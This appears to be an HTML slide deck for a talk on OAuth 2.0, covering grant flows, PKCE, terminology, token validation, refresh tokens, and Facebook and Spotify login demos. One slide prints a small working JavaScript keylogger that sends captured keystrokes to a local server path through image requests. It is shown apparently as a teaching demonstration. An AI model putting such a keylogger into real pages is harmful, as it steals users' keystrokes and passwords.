<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
<head>

    <meta charset="utf-8">
    <link href="http://localhost:9020/static/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">

    <link href="http://localhost:9020/static/css/simplebar.css" rel="stylesheet" />
    <script src="http://localhost:9020/static/js/external/simplebar.js"></script>
    <script src="http://localhost:9020/static/js/external/jquery-3.3.1.min.js"></script>
    <script src="http://localhost:9020/static/js/external/socket.io.dev.js"></script>
    <script src="http://localhost:9020/static/js/external/popper.min.js" ></script>
    <script src="http://localhost:9020/static/js/external/bootstrap.min.js"></script>
    <script src="https://sdk.scdn.co/spotify-player.js"></script>
    <script src="../static/js/authdemo.js"></script>
    <script src="../static/js/imageMapResizer.min.js"></script>

    <style>
        html {
            overscroll-behavior: auto;
        }

        html body {
            width: 2070px;
            padding-right: 0 !important;
            background-color: #0b0e16;
            color: #a1afc3;
        }

        .card-title {
            color: black;
            font-weight: 500;
            font-size: 40px;
        }

        .card-text {
            font-size: 15px;
        }

        .carousel-item {
            height: 1100px;
        }

        .carousel-control-prev{
            width: 50px;
        }

        .carousel-control-next{
            width: 50px;
        }

        .server-msg {color:blue;}
        .client-msg {color:green;}
        .disconnect-msg {color:blue;}

        .btn-close {
            opacity: 0.99;
            float: right;
            font-size: 1.5rem;
            font-weight: 700;
            line-height: 1;
            margin: 3px;
            padding: 3px;
        }

        .modal-dialog {
            bottom: 5px;
            max-width: 1050px;
        }

        .modal-content {
            background: #323436;
            -webkit-border-radius: 1px !important;
            -moz-border-radius: 1px !important;
            border-color: #a1afc3;
            border-radius: 1px !important;
        }

        .modal-header {
            border-bottom: 0 none;
        }

        .modal-footer {
            border-top: 0 none;
        }

        img {
            max-width:100%;
            height:auto;
            max-height:100%;
        }

        .data-link{
            font-weight: 500;
            font-size: 30px;
        }

        table {
            border: dotted 1px #a1afc3;
        }

        table td, table th {
            border: dotted 1px #a1afc3;
        }

        .carousel-control-prev-icon {
            background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%230000FF' viewBox='0 0 8 8'%3E%3Cpath d='M5.25 0l-4 4 4 4 1.5-1.5-2.5-2.5 2.5-2.5-1.5-1.5z'/%3E%3C/svg%3E") !important;
        }

        .carousel-control-next-icon {
            background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%230000FF' viewBox='0 0 8 8'%3E%3Cpath d='M2.75 0l-1.5 1.5 2.5 2.5-2.5 2.5 1.5 1.5 4-4-4-4z'/%3E%3C/svg%3E") !important;
        }

    </style>


    <!--function HandlePopupResult(result) {-->
    <!--alert("result of popup is: " + result);-->
    <!--}-->

    <!--In the child window code add this:-->

    <!--function CloseMySelf(sender) {-->
    <!--try {-->
    <!--window.opener.HandlePopupResult(sender.getAttribute("result"));-->
    <!--}-->
    <!--catch (err) {}-->
    <!--window.close();-->
    <!--return false;-->
    <!--}-->

</head>
<body>
<div class="row-container" style="width: 95px; position: absolute; right: 10px; top: 15px; z-index: 9999;">
    <output id="sessionTimer" ondblclick="resetTimer()" style="font-size: 19px;">00:00.000</output>
</div>

<div id="slides" class="carousel slide" data-ride="carousel" >
    <ol class="carousel-indicators">
        <li data-target="#slides" data-slide-to="0" class="active"></li>
        <li data-target="#slides" data-slide-to="1"></li>
        <li data-target="#slides" data-slide-to="2"></li>
        <li data-target="#slides" data-slide-to="3"></li>
        <li data-target="#slides" data-slide-to="4"></li>
        <li data-target="#slides" data-slide-to="5"></li>
        <li data-target="#slides" data-slide-to="6"></li>
        <li data-target="#slides" data-slide-to="7"></li>
        <li data-target="#slides" data-slide-to="8"></li>
        <li data-target="#slides" data-slide-to="9"></li>
        <li data-target="#slides" data-slide-to="10"></li>
        <li data-target="#slides" data-slide-to="11"></li>
        <li data-target="#slides" data-slide-to="12"></li>
        <li data-target="#slides" data-slide-to="13"></li>
        <li data-target="#slides" data-slide-to="14"></li>
        <li data-target="#slides" data-slide-to="15"></li>
        <li data-target="#slides" data-slide-to="16"></li>
    </ol>
    <div class="carousel-inner" style="margin-top: 2em;">
        <div class="carousel-item active">
            <div class="container" style="height: 35%; display: flex; align-items: center; justify-content: center;">
                <div class="row">
                    <div class="col align-self-center" >
                        <img class="d-block" src="../static/drawings/final/OAUTH2.png">
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-md-4">
                    <div class="card mb-2">
                        <div class="card-body">
                            <h4 class="card-title">Authorization Code</h4>
                            <p class="card-text">
                                RO as Resource Owner (browser)<br/>
                                CA as Client App (yelp.com)<br/>
                                AS as Authorization Server (Google)<br/>
                                RS as Resource Server (Contacts API)<br/>
                                <br/>
                                RO->>CA: 1. Click Login with Google<br/>
                                CA->>RO: 2. Redirect...<br/>
                                RO->>AS: 3. ...to Google Login<br/>
                                AS->>RO: 4. Returns Login Form<br/>
                                RO->>AS: 5. Submits Credentials<br/>
                                note right of AS: authenticate user<br/>
                                AS->>RO: 6. Redirect with code...<br/>
                                RO->>CA: 7. ...to App with code<br/>
                                CA->>AS: 8. Request Token<br/>
                                note over CA,AS: request includes:<br/>Client ID, Client Secret & code<br/>
                                note right of AS: validate:<br/>- Client ID<br/>- Client Secret<br/>- code<br/>
                                AS->>CA: 9. Return Token<br/>
                                CA->>RS: 10. API Request with Token<br/>
                                note right of RS: validate Token<br/>
                                RS->>CA: 11. API Response.</p>
<!--                            <a class="btn btn-primary">Button</a>-->
                        </div>
                    </div>
                </div>
                <div class="col-md-4 clearfix d-none d-md-block">
                    <div class="card mb-2">
                        <div class="card-body">
                            <h4 class="card-title">Client Credentials</h4>
                            <p class="card-text">
                                CA as Client App (SPA in Browser)<br/>
                                AS as Authorization Server (Google)<br/>
                                RS as Resource Server (Contacts API)<br/>
                                <br/>
                                loop 1. Login w/Google<br/>
                                CA->>CA: 2. Redirect...<br/>
                                end<br/>
                                CA->>AS: 3. ...to Google Login<br/>
                                AS->>CA: 4. Returns Login Form<br/>
                                CA->>AS: 5. Submits Credentials<br/>
                                note right of AS: authenticate user<br/>
                                AS->>CA: 6. Respond with TOKENS<br/>
                                CA->>RS: 7. API Request with Token<br/>
                                note right of RS: validate Token<br/>
                                RS->>CA: 8. API Response.
                            </p>
<!--                            <a class="btn btn-primary">Button</a>-->
                        </div>
                    </div>
                </div>
                <div class="col-md-4 clearfix d-none d-md-block">
                <div class="card mb-2">
                        <div class="card-body">
                            <h4 class="card-title">PKCE</h4>
                            <p class="card-text">
                                RO as Resource Owner<br/>
                                CA as Client App (vue.js)<br/>
                                AS as Authorization Server<br/>
                                <br/>
                                RO->>CA: 1. Access App<br/>
                                note right of CA: create random (v)<br/>$ = sha256(v)<br/>
                                CA->>RO: 2. Redirect with $<br/>
                                RO->>AS: 3. Redirect to Login with $<br/>
                                note right of AS: store $<br/>
                                AS->>RO: 4. Returns Login Form<br/>
                                RO->>AS: 5. Submits Credentials<br/>
                                note right of AS: authenticate user<br/>
                                AS->>RO: 6. Redirect with code (α)<br/>
                                RO->>CA: 7. Redirect to App with code (α)<br/>
                                CA->>AS: 8. Request Token<br/>
                                note over CA,AS: request includes:<br/>Client ID, (v), (α)<br/>
                                note right of AS: validate:<br/>- Client ID<br/>- sha256(v) = $<br/>- (α)<br/>
                                AS->>CA: 9. Return Token<br/>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="row">
                <div class="col-md-6 clearfix d-none d-md-block">
                    <div class="card mb-2">
                        <img class="card-img-top" src="../static/drawings/final/Facebook.jpg"
                             alt="Card image cap" style="max-width:100%; max-height:100%;">
                        <div class="card-body">
                            <div class="row justify-content-left align-self-start" style="margin-top: 1em; margin-left: 1em;">
                                <div class="container">
                                    <div class="row">
                                        <div class="col-2">
                                            <div class="fb-login-button" data-width="" data-size="large" data-button-type="login_with" data-auto-logout-link="false" data-use-continue-as="true" autologoutlink="true" onlogin="checkLoginState();"></div>
                                            <input type="submit" value="Get Info" class="btn btn-default" onclick="getInfo()" style="margin-top: 10px; font-size: 25px; height: 60px">
                                        </div>
                                        <div class="col-6">
                                            <div id="fbuserpicture"></div>
                                        </div>
                                        <div class="col-4">
                                            <div id="fbstatus" style="margin-top: 5px; font-size: 25px;"></div>
                                            <div id="fbuserid" style="margin-top: 5px; font-size: 25px;"></div>
                                            <div id="fbusername" style="margin-top: 5px; font-size: 25px;"></div>
                                            <div id="fbemail" style="margin-top: 5px; font-size: 25px;"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-6 clearfix d-none d-md-block">
                    <div class="card mb-2">
                        <div class="container" style="display: flex; align-items: center; justify-content: center;" >
                            <img class="card-img-top" src="../static/drawings/final/spotify.png"
                                 alt="Card image cap" style="justify-content:center; max-width:60%; max-height:60%;">
                        </div>
                        <div class="card-body">
                            <div class="row justify-content-md-center">
                                <iframe src="https://open.spotify.com/embed/track/2YeJORVq6xkcOn0UOPN2zd" width="300" height="80" frameborder="0" allowtransparency="true" allow="encrypted-media"></iframe>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="carousel-caption d-none d-md-block">
                <h5>Facebook is 2.5 billions and global its a chalenge and advantage. Who has no facebook account?</h5>
                <h5>And Spotify I just like. Cool content and JS based dynamic frontend.</h5>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h2>//############# KEY LOGGER ######################</h2>
                        <h2><br></h2>
                        <h2>var keys_ = '';</h2>
                        <h2>document.onkeypress = function(e) {</h2>
                        <h2>&nbsp;&nbsp;get = window.event?event:e;</h2>
                        <h2>&nbsp;&nbsp;key = get.keyCode?get.keyCode:get.charCode;</h2>
                        <h2>&nbsp;&nbsp;key = String.fromCharCode(key);</h2>
                        <h2>&nbsp;&nbsp;keys_+=key;</h2>
                        <h2>}</h2>
                        <h2>window.setInterval(function(){</h2>
                        <h2>&nbsp;&nbsp;if(keys_.length > 0) {</h2>
                        <h2>&nbsp;&nbsp;&nbsp;&nbsp;new Image().src = 'http://localhost:9020/imgkey/'+keys_;</h2>
                        <h2>&nbsp;&nbsp;&nbsp;&nbsp;keys_ = '';</h2>
                        <h2>&nbsp;&nbsp;}</h2>
                        <h2>}, 10000);</h2>
                        <h2><br></h2>
                        <h2>//############# KEY LOGGER  ######################</h2>
                        <h2><br></h2>
                        <h2>C:\dev\soft\nginx\logs</h2>
                    </div>
                </div>
            </div>
            <div class="carousel-caption d-none d-md-block">
                <h5>Key logger</h5>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>What is Oauth2?</h1>
                        <h4>Extracting authoriation and authetication service from functional domain as a standalone independent service.</h4>
                    </div>
                </div>
            </div>
            <div class="carousel-caption d-none d-md-block">
                <h5>Authorization and authentication.</h5>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Things that solves OAuth 2.0: </h1>
                        <div style="margin-left: 2em;">
                            <ul>
                                <li style="margin-top: 5em;">
                                    <h2> Simple Login. - Authentication</h2>
                                </li>
                                <li>
                                    <h2> Single Sign on. - Authentication</h2>
                                </li>
                                <li>
                                    <h2> Mobile App Login - Authentication</h2>
                                </li>
                                <li>
                                    <h2> Delegated Authorization. - Authorization</h2>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="carousel-caption d-none d-md-block">
                <h1>Why Oauth2?</h1>
            </div>
        </div>
        <div class="carousel-item">
                <div class="row align-items-end">
                    <div class="col align-self-center" style="margin-left: 2em;">
                        <h1>Problems of Oauth2.</h1>
                        <div style="margin-left: 2em;">
                            <ul>
                                <li style="margin-top: 5em;">
                                    <h2> No standard on user information or set of scopes. And its not getting better.</h2>
                                </li>
                                <li>
                                    <h2> Custom or confusing implementations.</h2>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row justify-content-left">
                    <div class="col-3">
                        <img class="d-block w-100" src="../static/drawingsparttwo/final/1920px-CloudFoundryCorp_vertical.svg.png">
                    </div>
                    <div class="col-3">
                        <img class="d-block w-100" src="../static/drawingsparttwo/final/1920px-OneLogin_logo.svg.png">
                    </div>
                    <div class="col-3">
                        <img class="d-block w-100" src="../static/drawingsparttwo/final/auth0-logo-blue.png">
                    </div>
                    <div class="col-3">
                        <img class="d-block w-100" src="../static/drawingsparttwo/final/Okta_logo.svg">
                    </div>
                </div>
            <div class="carousel-caption d-none d-md-block">
                <h5>Spring cloud recommends OKTA</h5>
                <h5>Alternatively there is Cloud Foundry</h5>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Oauth 2.0 and OpenId.</h1>
                        <h1><br></h1>
                        <h2><strong>Oauth 2.0</strong> - is Authorization protocol.</h2>
                        <div style="margin-left: 2em;">
                            <h2>Granting access to your API.</h2>
                            <h2>Getting access to user data in other systems. (Pull)</h2>
                        </div>
                        <h2><br></h2>
                        <h2><strong>OpenId</strong> - is Authentication protocol</h2>
                        <div style="margin-left: 2em;">
                            <h2>Logging in.</h2>
                            <h2>Making your accounts availible in other systems. (Push.)</h2>
                        </div>
                        <h2><br></h2>
                        <h2>Usually you will see combination of them.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Terminology.</h1>
                        <h2><br></h2>
                        <h2>&bull; Resource owner(User) Consent/Permission.</h2>
                        <h2>&bull; Client (Application)</h2>
                        <div style="margin-left: 2em;">
                            <h2>&ndash; (Confidential can keep a secret(server side running)</h2>
                            <h2>&ndash; Public cannot(User controlled, Embeded things, JS SPA, mobile)</h2>
                            <h2>&ndash; (Client ID, Client Secret/PKCE, Scope, RedirectUri, State) </h2>
                        </div>
                        <h2>&bull; Authorization Server</h2>
                        <h2>&bull; Resource Server</h2>
                        <h2>&bull; Authorization grant(Flow)</h2>
                        <h2>&bull; Access Token</h2>
                        <h2>&bull; Refresh Token</h2>
                        <h2>&bull; OpenId https://openid.net/developers/specs/ https://connect2id.com/learn/openid-connect</h2>
                        <h2>&bull; Front channel (more secure)</h2>
                        <h2>&bull; Back Channel (less secure)</h2>
                    </div>
                </div>
            </div>
            <div class="carousel-caption d-none d-md-block">
                <h5>https://habr.com/ru/post/422765/</h5>
                <h5>https://www.youtube.com/watch?v=5cQNwifDq1U</h5>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Flow grant type and Usecase:</h1>
                        <h2>Web application with backend - authorization code flow.</h2>
                        <h2>Native mobile app - authorization code flow with PKCE (client secret is not exposed.)</h2>
                        <h2>JavaScript app(SPA) with out backend (only front channel) - Implicit flow.</h2>
                        <h2>Microservices and Backend flow only - client credentials.</h2>
                        <h2>Web application and backend both get access token - Hybrid Flow.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Token Validation</h1>
                        <h1><br></h1>
                        <h2><strong>Local validation (Fast)</strong></h2>
                        <h2>&bull; Expiration</h2>
                        <h2>&bull; Cryptographic signature.</h2>
                        <h2><strong>Introspection (Slow)</strong></h2>
                        <h2>&bull; Call to authorization server.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Revocation</h1>
                        <h2>&bull; Url based.</h2>
                        <h2>&bull; Introspection based.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Refresh token</h1>
                        <h2>1. Send user back to auth server (if he has session on auth server it will be super quick).</h2>
                        <h2>2. Call auth server yourself exchanging refresh token for new access token and refresh token.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Misc and common practice</h1>
                        <h2>Multy factor support in single place (Auth server).</h2>
                        <h2>SMS, Biometrics, verification call.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Scopes and TokenEnhancerChain</h1>
                        <h2>Auth server classes and technology stack.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Practical example of authorization code flow.</h1>
                        <h2>User microservice comunication show database, show signing, show on client token interception.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Show integration with facebook</h1>
                        <h2>Facebook. Access rights.  Spring social. Explain classes and API. Philosophy. Talk about millions of customers.</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="carousel-item">
            <div class="container" style="height: 100%; display: flex; align-items: center; justify-content: center;" >
                <div class="row align-items-end">
                    <div class="col align-self-center">
                        <h1>Show integration with Spotify and finalize.</h1>
                        <h2>Facebook. Access rights.  Spring social. Explain classes and API. Philosophy.</h2>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
    <a class="carousel-control-prev" href="#slides" role="button" data-slide="prev">
        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
        <span class="sr-only">Previous</span>
    </a>
    <a class="carousel-control-next" href="#slides" role="button" data-slide="next">
        <span class="carousel-control-next-icon" aria-hidden="true"></span>
        <span class="sr-only">Next</span>
    </a>
    <script>
        $('.carousel').carousel({
            interval: false
        })
    </script>
    <script>
        // remember last slide posisition;
        $('.carousel').bind('slide.bs.carousel', function(e){
            var slideFrom = $(this).find('.active').index();
            var slideTo = $(e.relatedTarget).index();
            localStorage.setItem('slide_part2', slideTo)
        });
    </script>
    <script>
        var slide = localStorage.getItem('slide_part2');
        if (slide === null) {
            // do nothing
        } else {
            // return to last saved slide
            $('.carousel').carousel(parseInt(slide));
        }
    </script>

</div>

</body>
</html>
